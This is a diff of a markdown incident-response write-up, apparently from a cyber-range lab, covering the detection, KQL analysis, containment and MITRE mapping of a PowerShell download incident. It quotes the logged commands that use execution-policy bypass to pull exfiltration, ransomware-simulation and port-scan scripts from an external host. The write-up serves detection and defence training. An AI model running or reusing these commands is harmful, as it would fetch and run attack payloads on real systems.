@@ -2,52 +2,69 @@
 
 ---
 
-## 1. Detection
+## 1. Overview & Explanation
+A security alert was generated when **PowerShell** invoked the `Invoke-WebRequest` command to download multiple suspicious scripts from a **GitHub** repository. This tactic is often seen in **post-exploitation** scenarios, where attackers use legitimate system utilities like **PowerShell** to evade defenses and retrieve malicious payloads. By blending in with normal Windows processes, they can deploy backdoors, exfiltrate data, or run malicious scripts with minimal detection.
 
-**Incident Trigger:**  
-An alert was raised for suspicious PowerShell web requests involving the account:
+In this case, logs from **Microsoft Defender for Endpoint (MDE)** and **Microsoft Sentinel** showed four separate script downloads from **windows-target-1**. Further analysis confirmed these scripts had also been **executed** locally. Following NIST 800-61 guidelines, the incident was triaged, contained, eradicated, and lessons learned were documented.
 
-**Account:** `<king>`
+---
 
-**Affected Host Information:**
-- **HostName:** `king-vm`
-- **Operating System:** Windows
-- **OS Version:** Windows
-- **Last Internal IP Address:** `10.0.0.84`
-- **Last External IP Address:** `68.154.42.194`
-
-**Observed Commands Executed:**  
-The following PowerShell commands were executed using the `-ExecutionPolicy Bypass` parameter:
-
-```powershell
-cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
-cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
-cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
-cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1
-```
-
-🧮 Detection Query:
-To investigate the execution of suspicious PowerShell scripts, the following KQL query was used:
+## 2. Detection & Alert Rule Creation
+### 2.1 Sentinel Alert Configuration
+**Alert Name**: “PowerShell Suspicious Web Request”  
+**Condition**: Triggers when `Invoke-WebRequest` is used to download files from an external domain.  
+**Data Source**: DeviceProcessEvents in MDE, forwarded to Sentinel via **Log Analytics Workspace**.
 
 ```kql
-let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
+// Identify PowerShell commands downloading scripts from external sources
 DeviceProcessEvents
-| where DeviceName == "king-vm"
-| where ProcessCommandLine contains "-File" and InitiatingProcessCommandLine has_any (ScriptNames)
-| order by TimeGenerated
-| project TimeGenerated, AccountName, DeviceName, FileName, InitiatingProcessCommandLine
-| summarize Count = count() by AccountName, DeviceName, FileName, InitiatingProcessCommandLine
+| where DeviceName contains "windows-target-1"
+| where InitiatingProcessCommandLine contains "invoke-webrequest"
+| project TimeGenerated, AccountName, ActionType, DeviceName, FileName, 
+         FolderPath, InitiatingProcessCommandLine, SHA256
+| order by TimeGenerated desc
 ```
 
-### 📑 NIST 800-161 Compliance:
+Result: An incident was automatically created for further investigation.
 
-- ID.AM-1: Inventory and management of user accounts and scripts.
+---
 
-- PR.DS-5: Protection of system integrity by detecting unauthorized code execution.
+## 3. Incident Analysis
+### 3.1 Process Events
+Upon investigating the alert, the following commands were identified:
 
-## 2. Analysis
+```
+"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest 
+  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 
+  -OutFile C:\programdata\eicar.ps1
+"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest 
+  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 
+  -OutFile C:\programdata\exfiltratedata.ps1
+"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest 
+  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 
+  -OutFile C:\programdata\portscan.ps1
+"cmd.exe" /c powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest 
+  -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 
+  -OutFile C:\programdata\pwncrypt.ps1
+```
 
-#### Code Review: Using Browserling, the URLs were accessed, and the scripts were analyzed. Each script’s function was verified and categorized.
+The user later confirmed they had clicked on a link to download free software around the same time the alert was generated, saw a “black screen pop up and then nothing happened,” unaware the scripts had downloaded and executed in the background.
+
+### 3.2 Script Execution Confirmation
+A follow-up query revealed the same scripts had also been run locally:
+
+```
+let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
+DeviceProcessEvents
+| where DeviceName == "windows-target-1"
+| where ProcessCommandLine contains "-File" 
+      and InitiatingProcessCommandLine has_any (ScriptNames)
+| order by TimeGenerated
+| project TimeGenerated, AccountName, DeviceName, FileName, InitiatingProcessCommandLine
+| summarize by AccountName, DeviceName, FileName, InitiatingProcessCommandLine
+```
+
+### 3.3 Code Review: Using Browserling, the URLs were accessed, and the scripts were analyzed. Each script’s function was verified and categorized.
 
 #### One-Line Descriptions of Each Script:
 
@@ -59,45 +76,61 @@ DeviceProcessEvents
 
 - **[pwncrypt.ps1](https://github.com/K-ING-TECH/Incident-Response_Invoke-WebRequest/blob/main/pwncrypt.ps1)** - Encrypts files containing sensitive data and leaves a ransom note, simulating ransomware behavior.
 
-## MITRE ATT&CK TTP Assessment:
-- **T1046 - Network Service Scanning**: Executed through portscan.ps1.
+Finding: This indicates an active malicious or test scenario, as scripts were successfully invoked on the system.
 
-- **T1059.001 - Command and Scripting Interpreter**: PowerShell - Usage of PowerShell for execution.
+---
 
-- **T1567.002 - Exfiltration Over Alternative Protocol**: Data exfiltration simulated by uploading to Azure Blob Storage.
+## 4. Containment, Eradication, & Recovery
+### 4.1 Containment Actions
+Device Isolation
 
-- **T1486 - Data Encrypted for Impact**: Encryption of local files via pwncrypt.ps1.
+Used Microsoft Defender for Endpoint to isolate the target (windows-target-1), cutting off external attacker communication.
+Comprehensive AV Scan
 
-## 3. Containment, Eradication, and Recovery
-🚫 Containment Actions:
+Ran a full antivirus scan to detect and remove potential malware associated with the downloaded scripts.
+### 4.2 Eradication Steps
+Reimaging & Redeployment
 
-- Isolated the device from the network using Microsoft Defender for Endpoint (MDE).
+Restored the machine from a known-good backup to ensure all malicious artifacts were removed.
 
-- Executed a comprehensive antivirus (AV) scan to detect and mitigate any further malicious code.
+### 4.3 Recovery Measures
 
-### Eradication Steps:
+#### Security Awareness Training
+Enrolled the affected user in KnowBe4 advanced training for phishing and malicious link recognition.
 
-- Reimaged the device and redeployed it using the last known good backup.
+#### Policy Updates
+Restricted PowerShell usage to administrative accounts only.
 
-### Recovery Measures:
+Created a new rule preventing Invoke-WebRequest for non-privileged users.
 
-- Enrolled the affected user in an updated security awareness training program using KnowBe4.
+---
 
-- Developed and implemented a new policy to restrict PowerShell usage for non-administrative users.
+## 5. Post-Incident Activities
+#### Lessons Learned
+Reinforced user education on suspicious links.
 
-## 📑 NIST 800-61 Compliance:
+Identified a policy gap allowing unprivileged PowerShell downloads.
 
-- PR.PT-5: Restrict execution of scripts and enforce least privilege for administrative actions.
+#### Policy Enforcement
+Implemented new controls restricting remote download commands.
 
-- RS.MI-3: Eradication of malware and unauthorized scripts.
+Elevated overall logging and alert thresholds for external script pulls.
 
-- RC.IM-1: Implementation of improved policies to mitigate future incidents.
+#### Incident Closure
+Verified all malicious scripts and processes were removed.
 
-## 4. Lessons Learned & Security Improvements
-- Enhance monitoring rules for PowerShell execution with bypass flags.
+Closed the Sentinel incident as “True Positive.”
 
-- Implement stricter conditional access and endpoint protection policies.
+---
 
-- Regularly audit administrative privileges and script execution logs.
+## 6. Conclusion
+The detection of PowerShell Invoke-WebRequest commands downloading four malicious scripts triggered a Sentinel alert. Investigation confirmed both the download and execution of the scripts, marking a successful infiltration attempt. Quick device isolation and thorough scanning limited damage. Post-incident actions included reimaging the machine, updating security policies, and enhancing user training to mitigate future threats. By following NIST 800-61 practices, this incident was effectively contained, eradicated, and used as an opportunity to strengthen overall cybersecurity posture.
 
+---
 
+## 7. MITRE ATT&CK TTPs
+**T1059.001 (Command & Scripting Interpreter:** PowerShell)	Attacker utilized PowerShell commands (Invoke-WebRequest) to download and execute payloads.
+
+**T1105 (Ingress Tool Transfer):**	Scripts/payloads transferred from an external source (GitHub) onto the target system.
+
+**T1027 (Obfuscated Files or Information):**	Potential script obfuscation, bypass of security policies, and stealthy use of PowerShell.
